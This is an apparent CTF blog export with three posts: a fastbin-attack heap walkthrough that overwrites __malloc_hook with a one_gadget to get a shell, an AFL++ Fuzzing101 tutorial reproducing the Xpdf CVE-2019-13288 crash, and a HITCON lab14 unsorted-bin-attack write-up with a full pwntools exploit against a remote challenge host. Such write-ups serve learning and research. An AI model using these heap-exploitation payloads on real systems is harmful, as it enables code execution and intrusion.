0x5555557570000x555555757000:\t0x0000000000000000\t0x0000000000000021 #index00x555555757010:\t0x0000000000000000\t0x00000000000000000x555555757020:\t0x0000000000000000\t0x0000000000000021 #index10x555555757030:\t0x0000000000000000\t0x00000000000000000x555555757040:\t0x0000000000000000\t0x0000000000000021 #index20x555555757050:\t0x0000000000000000\t0x00000000000000000x555555757060:\t0x0000000000000000\t0x0000000000000021 #index30x555555757070:\t0x0000000000000000\t0x00000000000000000x555555757080:\t0x0000000000000000\t0x0000000000000021 #index40x555555757090:\t0x0000000000000000\t0x0000000000000000.....（省略内容均为空）0x555555757110:\t0x0000000000000000\t0x0000000000020ef1 #top_chunk0x555555757120:\t0x0000000000000000\t0x0000000000000000.....（省略内容均为空）0x555555757180:\t0x0000000000000000\t0x0000000000000000pwndbg&gt; \n\n此时的结构体状况：\n0x5fcead98730:\t0x0000000000000001\t0x0000000000000010    \t\t\t#index00x5fcead98740:\t0x0000555555757010\t0x0000000000000001    \t\t\t\t\t\t\t\t#index1（chunk_flag改变）0x5fcead98750:\t0x0000000000000010\t0x0000555555757050                #chunk_content_size（改变）   #chunk_data_ptr（改变）     0x5fcead98760:\t0x0000000000000001\t0x0000000000000010     \t\t\t#index2（chunk_flag改变）  #chunk_data_size（改变）     0x5fcead98770:\t0x0000555555757090\t0x0000000000000001    \t\t\t#chunk_data_ptr（改变）  #index30x5fcead98780:\t0x0000000000000010\t0x00005555557570700x5fcead98790:\t0x0000000000000001\t0x0000000000000080    \t\t\t#index40x5fcead987a0:\t0x0000555555757090\t0x00000000000000000x5fcead987b0:\t0x0000000000000000\t0x0000000000000000\n\n注意，此时我们有两个地方指向index4：index4的content指针（程序的正常指向）index2的content指针 （通过执行payload中malloc之后的指向，参照上方代码框中的结构体）第二个malloc得到的是index为2的chunk，这与程序中的Allocate函数有关，可以回顾一下前面的IDA代码。也就是说假如我们现在要fill index2的内容，那么其实上是修改index4的内容。\n1-7 修改 index4 的 size 为0x91#为了让index4能够被放到unsortedbin中,要把它的大小改回来payload = p64(0)*3payload += p64(0x91)fill(3, payload)\n\npwndbg&gt; x/50gx 0x5555557570000x555555757000:\t0x0000000000000000\t0x0000000000000021 #index00x555555757010:\t0x0000000000000000\t0x00000000000000000x555555757020:\t0x0000000000000000\t0x0000000000000021 #index10x555555757030:\t0x0000000000000000\t0x00000000000000000x555555757040:\t0x0000000000000000\t0x0000000000000021 #index20x555555757050:\t0x0000000000000000\t0x00000000000000000x555555757060:\t0x0000000000000000\t0x0000000000000021 #index30x555555757070:\t0x0000000000000000\t0x00000000000000000x555555757080:\t0x0000000000000000\t0x0000000000000091 #index40x555555757090:\t0x0000000000000000\t0x0000000000000000.....（省略内容均为空）0x555555757110:\t0x0000000000000000\t0x0000000000020ef1 #top_chunk0x555555757120:\t0x0000000000000000\t0x0000000000000000.....（省略内容均为空）0x555555757180:\t0x0000000000000000\t0x0000000000000000pwndbg&gt; \n\n程序结构体未发生变化\n1-8 申请新堆块 index 5目的只是为了防止 index4 释放后与 top chunk 合并\n1-9 free(index4)，index4 放入 unsorted bin 中#这时候free就会把index4放到unsorted中了free(4)\n\nFree chunk (unsortedbin) | PREV_INUSEAddr: 0x555555757080Size: 0x91fd: 0x00bk: 0x7ffff7dd1b78pwndbg&gt; x/60gx 0x5555557570000x555555757000:\t0x0000000000000000\t0x0000000000000021 #index00x555555757010:\t0x0000000000000000\t0x00000000000000000x555555757020:\t0x0000000000000000\t0x0000000000000021 #index10x555555757030:\t0x0000000000000000\t0x00000000000000000x555555757040:\t0x0000000000000000\t0x0000000000000021 #index20x555555757050:\t0x0000000000000000\t0x00000000000000000x555555757060:\t0x0000000000000000\t0x0000000000000021 #index30x555555757070:\t0x0000000000000000\t0x00000000000000000x555555757080:\t0x0000000000000000\t0x0000000000000091 #index4（unsortedbin）0x555555757090:\t0x00007ffff7dd1b78\t0x00007ffff7dd1b78.....（省略内容均为空）0x555555757110:\t0x0000000000000000\t0x0000000000000090 #index5.....（省略内容均为空）0x5555557571a0:\t0x0000000000000000\t0x0000000000020e61 #top_chunk.....（省略内容均为空）0x5555557571d0:\t0x0000000000000000\t0x0000000000000000pwndbg&gt;\n\n当unsortedbin里只有一个空闲的chunk时，该chunk的fd和bk指针均指向unsortedbin本身，这个可以参考CTF-wiki中的内容，这里先不细说。\n0x5fcead98730:\t0x0000000000000001\t0x0000000000000010    \t\t\t#index00x5fcead98740:\t0x0000555555757010\t0x0000000000000001    \t\t\t\t\t\t\t\t#index10x5fcead98750:\t0x0000000000000010\t0x0000555555757050    0x5fcead98760:\t0x0000000000000001\t0x0000000000000010     \t\t\t#index2     0x5fcead98770:\t0x0000555555757090\t0x0000000000000001    \t\t\t\t\t\t\t    #index30x5fcead98780:\t0x0000000000000010\t0x00005555557570700x5fcead98790:\t0x0000000000000000\t0x0000000000000000    \t\t\t#index4（此处发生了改变）#（此处发生了改变）     0x5fcead987a0:\t0x0000000000000000\t0x0000000000000001    \t\t\t#（此处发生了改变）\t   #index50x5fcead987b0:\t0x0000000000000080\t0x0000555555757120\n\n1-10 计算libc基址-----------------------------------------------------------------------------还可以直接这样写libc_base = u64(dump(2)[:8].strip().ljust(8, \"\\x00\"))-0x3c4b78-----------------------------------------------------------------------------示例payload的写法：#因为index2是指向index4的，所以直接把index2给dump一下就能拿到index4中前一部分的内容了#main_arena与libc偏移为0x3c4b20(附件中有工具)#再加上main_arena与unsortedbin的偏移,得到unsortedbins与libc的偏移unsorted_offset_mainarena=unsorted_offset_arena(5)#这函数还不太明白unsorted_addr=u64(dump(2)[:8].strip().ljust(8, \"\\x00\"))libc_base=unsorted_addr-0x3c4b20-unsorted_offset_mainarenalog.info(\"libc_base: \"+hex(libc_base))    def unsorted_offset_arena(idx):    word_bytes = context.word_size / 8    offset = 4  # lock    offset += 4  # flags    offset += word_bytes * 10  # offset fastbin    offset += word_bytes * 2  # top,last_remainder    offset += idx * 2 * word_bytes  # idx    offset -= word_bytes * 2  # bin overlap    return offset-----------------------------------------------------------------------------\n\n2. 控制_malloc_hook2-1 申请 unsorted bin 中的 chunkalloc(0x60)\n\n由于在申请空间之前，之后unsortedbin中有空闲的空间，因此申请空间之后会使用unsortedbin中的chunk。看一下此时的堆内存：\npwndbg&gt; x/60gx 0x5555557570000x555555757000:\t0x0000000000000000\t0x0000000000000021 #index00x555555757010:\t0x0000000000000000\t0x00000000000000000x555555757020:\t0x0000000000000000\t0x0000000000000021 #index10x555555757030:\t0x0000000000000000\t0x00000000000000000x555555757040:\t0x0000000000000000\t0x0000000000000021 #index20x555555757050:\t0x0000000000000000\t0x00000000000000000x555555757060:\t0x0000000000000000\t0x0000000000000021 #index30x555555757070:\t0x0000000000000000\t0x00000000000000000x555555757080:\t0x0000000000000000\t0x0000000000000071 #index4(由unsortedbin分裂).....（省略内容均为空）0x5555557570f0:\t0x0000000000000000\t0x0000000000000021 #index5(由unsortedbin分裂)0x555555757100:\t0x00007ffff7dd1b78\t0x00007ffff7dd1b780x555555757110:\t0x0000000000000020\t0x0000000000000090 #index6（原index5）.....（省略内容均为空）0x5555557571a0:\t0x0000000000000000\t0x0000000000020e61 #top_chunk.....（省略内容均为空）0x5555557571d0:\t0x0000000000000000\t0x0000000000000000pwndbg&gt; \n\n从上面的堆情况可以看到，由于是malloc(0x60)，而原unsortedbin中的chunk_size过大，因此unsortedbin中的chunk会利用并分裂成两个堆块，其中index5还是存放在unsortedbin中的：\npwndbg&gt; binfastbins0x20: 0x00x30: 0x00x40: 0x00x50: 0x00x60: 0x00x70: 0x00x80: 0x0unsortedbinall [corrupted]FD: 0x5555557570f0 —▸ 0x7ffff7dd1b78 (main_arena+88) ◂— 0x5555557570f0BK: 0x5555557570f0 ◂— 0x90----------------------------------------------------------------------执行payload前：unsortedbinall [corrupted]FD: 0x555555757080 ◂— 0x0BK: 0x555555757080 —▸ 0x7ffff7dd1b78 (main_arena+88) ◂— 0x555555757080----------------------------------------------------------------------smallbinsemptylargebinsemptypwndbg&gt; \n\n2-2 free(index4)#index2_content指针还是指向index4_chunk_data#为了修改之后index4的fd指针，因此我们可以先释放index4free(4)\n\npwndbg&gt; binfastbins0x20: 0x00x30: 0x00x40: 0x00x50: 0x00x60: 0x00x70: 0x555555757080 ◂— 0x00x80: 0x0unsortedbin （这里显示不准确）all: 0x0smallbinsemptylargebinsemptypwndbg&gt;\n\npwndbg&gt; heapAllocated chunk | PREV_INUSEAddr: 0x555555757000Size: 0x21Allocated chunk | PREV_INUSEAddr: 0x555555757020Size: 0x21Allocated chunk | PREV_INUSEAddr: 0x555555757040Size: 0x21Allocated chunk | PREV_INUSEAddr: 0x555555757060Size: 0x71Allocated chunk | PREV_INUSEAddr: 0x5555557570d0Size: 0x21Allocated chunkAddr: 0x5555557570f0Size: 0x90Allocated chunk | PREV_INUSEAddr: 0x555555757180Size: 0x20e61pwndbg&gt; x/60gx 0x5555557570000x555555757000:\t0x0000000000000000\t0x0000000000000021 #index00x555555757010:\t0x0000000000000000\t0x00000000000000000x555555757020:\t0x0000000000000000\t0x0000000000000021 #index10x555555757030:\t0x0000000000000000\t0x00000000000000000x555555757040:\t0x0000000000000000\t0x0000000000000021 #index20x555555757050:\t0x0000000000000000\t0x00000000000000000x555555757060:\t0x0000000000000000\t0x0000000000000021 #index30x555555757070:\t0x0000000000000000\t0x00000000000000000x555555757080:\t0x0000000000000000\t0x0000000000000071 #index4（fastbin）.....（省略内容均为空）0x5555557570f0:\t0x0000000000000000\t0x0000000000000021 #index5（unsortedbin）0x555555757100:\t0x00007ffff7dd1b78\t0x00007ffff7dd1b780x555555757110:\t0x0000000000000020\t0x0000000000000090 #index6.....（省略内容均为空）0x5555557571a0:\t0x0000000000000000\t0x0000000000020e61 #top_chunk.....（省略内容均为空）0x5555557571d0:\t0x0000000000000000\t0x0000000000000000pwndbg&gt; \n\n0x5fcead98730:  0x0000000000000001  0x0000000000000010                #index00x5fcead98740:  0x0000555555757010  0x0000000000000001                                    #index10x5fcead98750:  0x0000000000000010  0x0000555555757050    0x5fcead98760:  0x0000000000000001  0x0000000000000010                #index2     0x5fcead98770:  0x0000555555757090  0x0000000000000001                                    #index30x5fcead98780:  0x0000000000000010  0x00005555557570700x5fcead98790:  0x0000000000000000  0x0000000000000000                #index4（此处发生了改变）#（此处发生了改变）     0x5fcead987a0:  0x0000000000000000  0x0000000000000001                #（此处发生了改变）     #index6（原index5）0x5fcead987b0:  0x0000000000000080  0x0000555555757120\n\n2-3 修改index4的fd指针#然后修改fd指针,通过index2往index4上写为malloc_hook,这样再次申请的时候会分配到这个地址#但问题是我们去申请的时候会检查size是不是 fakefd + 8 == 当前fastbin的大小#这个地址是main_arena-0x40+0xd,具体看后面图片解释payload = p64(libc_base+0x3c4aed)fill(2, payload)\n\npwndbg&gt; x/60gx 0x5555557570000x555555757000:\t0x0000000000000000\t0x0000000000000021 #index00x555555757010:\t0x0000000000000000\t0x00000000000000000x555555757020:\t0x0000000000000000\t0x0000000000000021 #index10x555555757030:\t0x0000000000000000\t0x00000000000000000x555555757040:\t0x0000000000000000\t0x0000000000000021 #index20x555555757050:\t0x0000000000000000\t0x00000000000000000x555555757060:\t0x0000000000000000\t0x0000000000000021 #index30x555555757070:\t0x0000000000000000\t0x00000000000000000x555555757080:\t0x0000000000000000\t0x0000000000000071 #index4（fastbin）0x555555757090:\t0x00007ffff7dd1aed\t0x0000000000000000    \t\t\t#更改index4的fd指针.....（省略内容均为空）0x5555557570f0:\t0x0000000000000000\t0x0000000000000021 #index5（unsortedbin）0x555555757100:\t0x00007ffff7dd1b78\t0x00007ffff7dd1b780x555555757110:\t0x0000000000000020\t0x0000000000000090 #index6.....（省略内容均为空）0x5555557571a0:\t0x0000000000000000\t0x0000000000020e61 #top_chunk.....（省略内容均为空）0x5555557571d0:\t0x0000000000000000\t0x0000000000000000pwndbg&gt; \n\npwndbg&gt; x/16gx 0x00007ffff7dd1aed0x7ffff7dd1aed &lt;_IO_wide_data_0+301&gt;:\t0xfff7dd0260000000\t0x000000000000007f0x7ffff7dd1afd:\t0xfff7a92ea0000000\t0xfff7a92a7000007f0x7ffff7dd1b0d &lt;__realloc_hook+5&gt;:\t0x000000000000007f\t0x00000000000000000x7ffff7dd1b1d:\t0x0000000000000000\t0x00000000000000000x7ffff7dd1b2d &lt;main_arena+13&gt;:\t0x0000000000000000\t0x00000000000000000x7ffff7dd1b3d &lt;main_arena+29&gt;:\t0x0000000000000000\t0x00000000000000000x7ffff7dd1b4d &lt;main_arena+45&gt;:\t0x5555757080000000\t0x00000000000000550x7ffff7dd1b5d &lt;main_arena+61&gt;:\t0x0000000000000000\t0x0000000000000000pwndbg&gt; \n\n2-4 控制__malloc_hook#这时候再去申请两个,第一个是给前面free的index4,第二个就会分配到malloc_hook处alloc(0x60)#index4alloc(0x60)#index7\n\n0x5fcead98730:  0x0000000000000001  0x0000000000000010                #index00x5fcead98740:  0x0000555555757010  0x0000000000000001                                    #index10x5fcead98750:  0x0000000000000010  0x0000555555757050    0x5fcead98760:  0x0000000000000001  0x0000000000000010                #index2     0x5fcead98770:  0x0000555555757090  0x0000000000000001                                    #index30x5fcead98780:  0x0000000000000010  0x00005555557570700x5fcead98790:  0x0000000000000001  0x0000000000000060                #index4（此处发生了改变）#（此处发生了改变）     0x5fcead987a0:  0x0000555555757090  0x0000000000000001                #（此处发生了改变）     #index6（原index5）0x5fcead987b0:  0x0000000000000080  0x00005555557571200x5fcead987c0:\t0x0000000000000001\t0x0000000000000060    \t\t\t#index70x5fcead987d0:\t0x00007ffff7dd1afd\t0x0000000000000000pwndbg&gt; \n\n2-5 写入 one_gadget 并 getshell#然后往malloc_hook上写one_gadget的地址payload = p8(0)*3payload += p64(0)*2payload += p64(libc_base+0x4527a)fill(6, payload)gdb.attach(p)\n\n2-6 最后申请一个chunkalloc(0x60)\n\n最后就能get shell 了\n","categories":["heap"],"tags":["fastbin attack"]},{"title":"Fuzzing101系列 Exercise 1","url":"/2023/11/08/Fuzzing101%E7%B3%BB%E5%88%97%20Exercise%201%20-%20Xpdf/","content":"转载 Fuzzing101系列 Exercise 1 - Xpdf 序言　Fuzzing101系列包含针对10 个真实目标的10个练习，在练习中一步一步学习Fuzzing技术的知识。\n　模糊测试（Fuzzing/Fuzz）是一种自动化软件测试技术，它基于为程序提供随机或变异的输入值并监视它的异常和崩溃。\n　AFL、libFuzzer 和 HonggFuzz 是现实世界应用中最多的三个模糊器，这三个都是覆盖引导的进化模糊器（Coverage-guided evolutionary fuzzer）。其中\n\n进化（evolutionary）是一种受进化算法启发的元启发式方法，它基本上包括通过使用选择标准（例如覆盖率）随时间推移初始子集（种子）的进化和变异。\n覆盖引导（Coverage-guided）是指为了增加发现新崩溃的机会，覆盖引导的模糊器收集和比较不同输入之间的代码覆盖率数据，并选择那些导致新执行路径的输入。\n\n　在这个练习中，我们将fuzz Xpdf PDF 查看器。目的是在 XPDF 3.02 中找到 CVE-2019-13288 的崩溃/PoC。\n　CVE-2019-13288 是一个漏洞，它可能会通过精心制作的文件导致无限递归。由于程序中每个被调用的函数都会在栈上分配一个栈帧，如果一个函数被递归调用这么多次，就会导致栈内存耗尽和程序崩溃。因此，远程攻击者可以利用它进行 DoS 攻击。可以在以下链接中找到有关不受控制的递归漏洞的更多信息：https://cwe.mitre.org/data/definitions/674.html\n你会学到什么　完成本练习后，你将了解使用 AFL 进行 fuzz 的基础，例如：\n\n使用检测编译目标应用程序\n运行模糊器（afl-fuzz）\n使用调试器 (GDB) 对崩溃进行分类\n\n环境　所有练习都在 Ubuntu 20.04.2 LTS 上进行了测试。 我强烈建议您使用相同的操作系统版本以避免不同的模糊测试结果，并在裸机硬件而不是虚拟机上运行 AFL，以获得最佳性能。\n　否则，您可以在此处找到 Ubuntu 20.04.2 LTS 镜像。用户名为 fuzz / fuzz。\n　AFL 使用非确定性测试算法，因此两个模糊测试会话永远不会相同。我强烈建议设置一个固定的种子（-s 123），这样你的模糊测试结果将与本文的结果相似。\n下载并构建目标　首先为要进行模糊测试的项目创建一个新目录：\ncd $HOMEmkdir fuzzing_xpdf &amp;&amp; cd fuzzing_xpdf/\n\n​\t为了完全准备好环境，需要安装一些额外的工具（make 和 gcc）\nsudo apt install build-essential\n\n​\t下载 Xpdf 3.02：\nwget https://dl.xpdfreader.com/old/xpdf-3.02.tar.gztar -xvzf xpdf-3.02.tar.gz\n\n​\t构建 Xpdf：\ncd xpdf-3.02sudo apt update &amp;&amp; sudo apt install -y build-essential gcc./configure --prefix=\"$HOME/fuzzing_xpdf/install/\"makemake install\n\n​\t下面对 Xpdf 进行测试，首先下载一些 PDF 示例：\ncd $HOME/fuzzing_xpdfmkdir pdf_examples &amp;&amp; cd pdf_exampleswget https://github.com/mozilla/pdf.js-sample-files/raw/master/helloworld.pdfwget http://www.africau.edu/images/default/sample.pdfwget https://www.melbpc.org.au/wp-content/uploads/2017/10/small-example-pdf-file.pdf\n\n使用以下命令测试 pdfinfo 二进制文件：\n$HOME/fuzzing_xpdf/install/bin/pdfinfo -box -meta $HOME/fuzzing_xpdf/pdf_examples/helloworld.pdf\n\n\n安装 AFL++​\t我们将使用最新版本的 AFL++ fuzzer(https://github.com/AFLplusplus/AFLplusplus)\n安装依赖项\nsudo apt-get updatesudo apt-get install -y build-essential python3-dev automake git flex bison libglib2.0-dev libpixman-1-dev python3-setuptoolssudo apt-get install -y lld-11 llvm-11 llvm-11-dev clang-11 || sudo apt-get install -y lld llvm llvm-dev clang sudo apt-get install -y gcc-$(gcc --version|head -n1|sed 's/.* //'|sed 's/\\..*//')-plugin-dev libstdc++-$(gcc --version|head -n1|sed 's/.* //'|sed 's/\\..*//')-dev\n\n构建 AFL++\ncd $HOMEgit clone https://github.com/AFLplusplus/AFLplusplus &amp;&amp; cd AFLplusplusexport LLVM_CONFIG=\"llvm-config-11\"make distribsudo make install\n\n执行afl-fuzz，查看是否安装成功\n\n认识 AFL++　AFL 是一个覆盖引导的模糊器（coverage-guided fuzzer），这意味着它收集每个变异输入的覆盖信息，来发现新的执行路径和潜在的错误。当源代码可用时，AFL 可以使用插桩（instrumentation），在每个基本块（函数、循环等）的开头插入函数调用。\n　要为我们的目标程序启用检测，我们需要使用 AFL 的编译器编译源代码。\n　首先，我们要清理所有之前编译的目标文件和可执行文件：\nrm -r $HOME/fuzzing_xpdf/installcd $HOME/fuzzing_xpdf/xpdf-3.02/make clean\n\n　现在我们将使用 afl-clang-fast 编译器构建 xpdf：\nexport LLVM_CONFIG=\"llvm-config-11\"CC=$HOME/AFLplusplus/afl-clang-fast CXX=$HOME/AFLplusplus/afl-clang-fast++ ./configure --prefix=\"$HOME/fuzzing_xpdf/install/\"makemake install\n\n　现在可以使用以下命令运行 fuzzer：\nafl-fuzz -i $HOME/fuzzing_xpdf/pdf_examples/ -o $HOME/fuzzing_xpdf/out/ -s 123 -- $HOME/fuzzing_xpdf/install/bin/pdftotext @@ $HOME/fuzzing_xpdf/output\n\n　每个选项的简要说明\n\n-i 表示输入示例的目录\n-o 表示 AFL + + 将存储的变异文件的目录\n-s 表示要使用的静态随机种子\n@@ 是占位符目标的命令行，AFL 将用每个输入文件名替换\n\n　fuzzer将会对每个不同的输入文件运行 $HOME/fuzzing_xpdf/install/bin/pdftotext &lt;input-file-name&gt; $HOME/fuzzing_xpdf/output 命令\n\n出现错误，根据提示，执行以下操作：\nsudo suecho core &gt;/proc/sys/kernel/core_patternexit\n\n　成功运行，等待一段时间后，发现已经有了一个crash\n\n可以在$HOME/fuzzing_xpdf/out/ 目录中找到这些崩溃文件。一旦发现第一次崩溃，就可以停止fuzzer，上图中已经出现了一个独特的崩溃。根据您的机器性能，最多可能需要一到两个小时才能发生崩溃。\n　为了完成这个练习，下面尝试使用指定的文件重现崩溃，调试崩溃发现问题，并且修复问题。\n重现崩溃　在$HOME/fuzzing_xpdf/out/目录下找到 crash 对应的文件。文件名类似于id:000000,sig:11,src:000390,time:103613,execs:71732,op:havoc,rep:16\n\n将此文件作为输入传递给 pdftotext\n$HOME/fuzzing_xpdf/install/bin/pdftotext '/home/fuzz/fuzzing_xpdf/out/default/crashes/&lt;your_filename&gt;' $HOME/fuzzing_xpdf/output\n\n　它将导致段错误segmentation fault并导致程序崩溃。\n\n调试　使用 gdb 找出程序因该输入而崩溃的原因。\n　首先使用调试信息重建 Xpdf 来获得符号堆栈跟踪：\nrm -r $HOME/fuzzing_xpdf/installcd $HOME/fuzzing_xpdf/xpdf-3.02/make cleanCFLAGS=\"-g -O0\" CXXFLAGS=\"-g -O0\" ./configure --prefix=\"$HOME/fuzzing_xpdf/install/\"makemake install\n\n　然后使用GDB，输入run\ngdb --args $HOME/fuzzing_xpdf/install/bin/pdftotext $HOME/fuzzing_xpdf/out/default/crashes/&lt;your_filename&gt; $HOME/fuzzing_xpdf/output\n\n\n然后输入bt回溯查看栈帧\n\n发现有许多次Parser::getObj的调用，它们似乎表示一个无限递归。如果你去 https://www.cvedetails.com/cve/cve-2019-13288/ ，你可以看到描述符合我们从 GDB 得到的回溯\n","categories":["Fuzzing101系列"],"tags":["Fuzzing101系列 Exercise 1"]},{"title":"HITCON Training lab14 magic heap","url":"/2023/09/15/HITCON%20Training%20lab14%20magic%20heap/","content":"unsortedbin_attack（例题）查看保护\n文件没开PIE，got表可写，开启了Canary和NX保护，64位程序。\n程序源代码#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;void read_input(char *buf, size_t size) {  int ret;  ret = read(0, buf, size);  if (ret &lt;= 0) {    puts(\"Error\");    _exit(-1);  }}char *heaparray[10];unsigned long int magic = 0;void menu() {  puts(\"--------------------------------\");  puts(\"       Magic Heap Creator       \");  puts(\"--------------------------------\");  puts(\" 1. Create a Heap               \");  puts(\" 2. Edit a Heap                 \");  puts(\" 3. Delete a Heap               \");  puts(\" 4. Exit                        \");  puts(\"--------------------------------\");  printf(\"Your choice :\");}void create_heap() {  int i;  char buf[8];  size_t size = 0;  for (i = 0; i &lt; 10; i++) {    if (!heaparray[i]) {      printf(\"Size of Heap : \");      read(0, buf, 8);      size = atoi(buf);      heaparray[i] = (char *)malloc(size);      if (!heaparray[i]) {        puts(\"Allocate Error\");        exit(2);      }      printf(\"Content of heap:\");      read_input(heaparray[i], size);      puts(\"SuccessFul\");      break;    }  }}void edit_heap() {  int idx;  char buf[4];  size_t size;  printf(\"Index :\");  read(0, buf, 4);  idx = atoi(buf);  if (idx &lt; 0 || idx &gt;= 10) {    puts(\"Out of bound!\");    _exit(0);  }  if (heaparray[idx]) {    printf(\"Size of Heap : \");    read(0, buf, 8);    size = atoi(buf);    printf(\"Content of heap : \");    read_input(heaparray[idx], size);    puts(\"Done !\");  } else {    puts(\"No such heap !\");  }}void delete_heap() {  int idx;  char buf[4];  printf(\"Index :\");  read(0, buf, 4);  idx = atoi(buf);  if (idx &lt; 0 || idx &gt;= 10) {    puts(\"Out of bound!\");    _exit(0);  }  if (heaparray[idx]) {    free(heaparray[idx]);    heaparray[idx] = NULL;    puts(\"Done !\");  } else {    puts(\"No such heap !\");  }}void l33t() { system(\"cat ./flag\"); }int main() {  char buf[8];  setvbuf(stdout, 0, 2, 0);  setvbuf(stdin, 0, 2, 0);  while (1) {    menu();    read(0, buf, 8);    switch (atoi(buf)) {    case 1:      create_heap();      break;    case 2:      edit_heap();      break;    case 3:      delete_heap();      break;    case 4:      exit(0);      break;    case 4869:      if (magic &gt; 4869) {        puts(\"Congrt !\");        l33t();      } else        puts(\"So sad !\");      break;    default:      puts(\"Invalid Choice\");      break;    }  }  return 0;}\n\n\n\nIDA静态分析main 函数int __cdecl __noreturn main(int argc, const char **argv, const char **envp){  int v3; // eax  char buf[8]; // [rsp+0h] [rbp-10h] BYREF  unsigned __int64 v5; // [rsp+8h] [rbp-8h]  v5 = __readfsqword(0x28u);  setvbuf(stdout, 0LL, 2, 0LL);  setvbuf(stdin, 0LL, 2, 0LL);  while ( 1 )  {    while ( 1 )    {      menu();      read(0, buf, 8uLL);      v3 = atoi(buf);      if ( v3 != 3 )        break;      delete_heap();    }    if ( v3 &gt; 3 )    {      if ( v3 == 4 )        exit(0);      if ( v3 == 4869 )      {        if ( (unsigned __int64)magic &lt;= 4869 )        {          puts(\"So sad !\");        }        else        {          puts(\"Congrt !\");          l33t();        }      }      else      {LABEL_17:        puts(\"Invalid Choice\");      }    }    else if ( v3 == 1 )    {      create_heap();    }    else    {      if ( v3 != 2 )        goto LABEL_17;      edit_heap();    }  }}\n\n看一看就行，接下来看具体函数功能\nl33t 存在后门函数int l33t(){  return system(\"cat /home/magicheap/flag\");}\n\n全局变量.bss:00000000006020B9                 align 20h.bss:00000000006020C0                 public magic.bss:00000000006020C0 ; __int64 magic.bss:00000000006020C0 magic           dq ?                    ; DATA XREF: main:loc_400D05↑r.bss:00000000006020C8                 align 20h.bss:00000000006020E0                 public heaparray.bss:00000000006020E0 ; heap *heaparray[10].bss:00000000006020E0 heaparray       dq ?                    ; DATA XREF: create_heap+30↑r.bss:00000000006020E0                                         ; create_heap+8C↑w ...\n\nmagic ：00000000006020C0\nheap_ptr ：00000000006020E0\nmeau函数int menu(){  puts(\"--------------------------------\");  puts(\"       Magic Heap Creator       \");  puts(\"--------------------------------\");  puts(\" 1. Create a Heap               \");  puts(\" 2. Edit a Heap                 \");  puts(\" 3. Delete a Heap               \");  puts(\" 4. Exit                        \");  puts(\"--------------------------------\");  return printf(\"Your choice :\");}\n\n打印菜单\ncreate函数unsigned __int64 create_heap(){  int i; // [rsp+4h] [rbp-1Ch]  size_t size; // [rsp+8h] [rbp-18h]  char buf[8]; // [rsp+10h] [rbp-10h] BYREF  unsigned __int64 v4; // [rsp+18h] [rbp-8h]  v4 = __readfsqword(0x28u);  for ( i = 0; i &lt;= 9; ++i )  {    if ( !heaparray[i] )    {      printf(\"Size of Heap : \");      read(0, buf, 8uLL);      size = atoi(buf);      heaparray[i] = (heap *)malloc(size);      if ( !heaparray[i] )      {        puts(\"Allocate Error\");        exit(2);      }      printf(\"Content of heap:\");      read_input(heaparray[i], size);      puts(\"SuccessFul\");      return __readfsqword(0x28u) ^ v4;    }  }  return __readfsqword(0x28u) ^ v4;}\n\n输入大小，创建相应大小的堆\nedit函数unsigned __int64 edit_heap(){  unsigned int v1; // [rsp+4h] [rbp-1Ch]  size_t v2; // [rsp+8h] [rbp-18h]  char buf[8]; // [rsp+10h] [rbp-10h] BYREF  unsigned __int64 v4; // [rsp+18h] [rbp-8h]  v4 = __readfsqword(0x28u);  printf(\"Index :\");  read(0, buf, 4uLL);  v1 = atoi(buf);  if ( v1 &gt;= 0xA )  {    puts(\"Out of bound!\");    _exit(0);  }  if ( heaparray[v1] )  {    printf(\"Size of Heap : \");    read(0, buf, 8uLL);    v2 = atoi(buf);    printf(\"Content of heap : \");    read_input(heaparray[v1], v2);    puts(\"Done !\");  }  else  {    puts(\"No such heap !\");  }  return __readfsqword(0x28u) ^ v4;}\n\n重新输入大小，更新内容，大小由我们定，存在堆溢出哦！！！\ndelete函数unsigned __int64 delete_heap(){  unsigned int v1; // [rsp+Ch] [rbp-14h]  char buf[8]; // [rsp+10h] [rbp-10h] BYREF  unsigned __int64 v3; // [rsp+18h] [rbp-8h]  v3 = __readfsqword(0x28u);  printf(\"Index :\");  read(0, buf, 4uLL);  v1 = atoi(buf);  if ( v1 &gt;= 0xA )  {    puts(\"Out of bound!\");    _exit(0);  }  if ( heaparray[v1] )  {    free(heaparray[v1]);    heaparray[v1] = 0LL;    puts(\"Done !\");  }  else  {    puts(\"No such heap !\");  }  return __readfsqword(0x28u) ^ v3;}\n\n正常free操作，指针清0，不存在uaf\nexp#!/usr/bin/env python# -*- coding: utf-8 -*-from pwn import *context.log_level = 'debug'p = process('./magicheap')p = remote('node4.buuoj.cn',29691)def create(size, content):    p.recvuntil(\":\")    p.sendline(\"1\")    p.recvuntil(\":\")    p.sendline(str(size))    p.recvuntil(\":\")    p.sendline(content)def edit(idx, size, content):    p.recvuntil(\":\")    p.sendline(\"2\")    p.recvuntil(\":\")    p.sendline(str(idx))    p.recvuntil(\":\")    p.sendline(str(size))    p.recvuntil(\":\")    p.sendline(content)def delete(idx):    p.recvuntil(\":\")    p.sendline(\"3\")    p.recvuntil(\":\")    p.sendline(str(idx))def debug():    gdb.attach(p)    pause()heap_ptr = 0x6020E0magic = 0x6020C0goal = magic - 0x10# 申请一个small chunkcreate(0x10,'a'*8)create(0x410,'b'*8)   #chunk0# 申请一个chunk1防 chunk0 合并create(500,'c'*8)#debug()delete(1)#debug()payload = p64(0)*3 + p64(0x421) + p64(0) + p64(goal)edit(0,len(payload),payload)#debug()create(0x410,\"666\")#debug()p.sendline(\"4869\")p.interactive()\n\n创建两个chunk0x1a65000:\t0x0000000000000000\t0x0000000000000021\t//chunk00x1a65010:\t0x6161616161616161\t0x000000000000000a 0x1a65020:\t0x0000000000000000\t0x0000000000000421\t//chunk10x1a65030:\t0x6262626262626262\t0x000000000000000a\n\n申请的 chunk(500) 以防止合并\n0x1a65440:\t0x0000000000000000\t0x0000000000000201\t//chunk30x1a65450:\t0x6363636363636363\t0x000000000000000a\n\nfree掉small chunk，被放入到 unsorted bin 中0x1a65000:\t0x0000000000000000\t0x00000000000000210x1a65010:\t0x6161616161616161\t0x000000000000000a0x1a65020:\t0x0000000000000000\t0x00000000000004210x1a65030:\t0x00007f9bd595bb78\t0x00007f9bd595bb78\n\nunsortedbinall: 0x1a65020 —▸ 0x7f9bd595bb78 (main_arena+88) ◂— 0x1a65020\n\n被放入unsorted bin 中\n观察全局变量\n0x6020c0 &lt;magic&gt;:\t0x0000000000000000\t0x00000000000000000x6020d0:\t0x0000000000000000\t0x00000000000000000x6020e0 